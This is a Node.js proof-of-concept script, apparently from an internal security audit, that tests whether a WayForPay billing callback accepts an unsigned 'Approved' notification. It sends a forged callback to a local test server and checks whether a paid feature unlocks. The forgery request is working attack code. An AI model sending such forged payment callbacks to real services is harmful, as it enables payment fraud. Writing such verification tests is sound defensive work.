// §8 CRITICAL — Billing callback trusts unsigned input + Mock=true in committed config.
// Two independent free-unlock paths:
//  (A) POST /api/billing/callback is [AllowAnonymous] and HandleCallbackAsync NEVER
//      verifies the WayForPay HMAC signature. Anyone who can present a valid
//      orderReference + {"transactionStatus":"Approved"} flips QuickAddUnlocked=true.
//  (B) Billing:Mock=true is committed in BOTH appsettings.json and
//      appsettings.Development.json -> ConfirmAsync returns paid=true unconditionally.
//
// Run: node 06-billing-callback-forgery.mjs
import { provision, api } from '../_lib/provision.mjs'

const line = (s = '') => process.stdout.write(s + '\n')

const u = await provision({ email: 'adv.t14.billing@gmail.com', nickname: 'Billing', gender: 'female' })
const t = u.token
line(`[setup] userId=${u.userId}`)

const s0 = await api('GET', '/api/quick-add/status', { token: t })
line(`[0] initial status -> unlocked=${s0.json?.unlocked} remaining=${s0.json?.remaining}`)

// Need a real orderReference. checkout creates a Pending payment and returns it.
const co = await api('POST', '/api/billing/checkout', { token: t })
const orderRef = co.json?.orderReference
line(`[1] checkout -> mock=${co.json?.mock} orderReference=${orderRef}`)

// --- PATH A: forge the serviceUrl callback with NO signature ---
const forgedBody = JSON.stringify({
  orderReference: orderRef,
  transactionStatus: 'Approved',
  // deliberately NO merchantSignature / wrong data
})
// send raw unsigned body manually (anonymous, no Authorization):
const cbRes = await fetch(`${process.env.ADV_BASE || 'http://localhost:5080'}/api/billing/callback`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: forgedBody,
})
line(`[2] UNSIGNED anonymous callback -> ${cbRes.status}  ${(await cbRes.text()).slice(0, 90)}`)

const s1 = await api('GET', '/api/quick-add/status', { token: t })
line(`[3] status after forged callback -> unlocked=${s1.json?.unlocked}`)

const confirmedA = s1.json?.unlocked === true
line('\n==============================================================')
line(`VERDICT (callback forgery): ${confirmedA ? 'CONFIRMED 🔴' : 'NOT reproduced'}`)
line('  expected: callback rejects a body with no/invalid merchantSignature')
line(`  observed: unsigned Approved callback flipped unlocked -> ${s1.json?.unlocked}`)
line('  -> Anyone who learns an orderReference unlocks the paid feature for free;')
line('     the HMAC signature from WayForPay is never checked.')
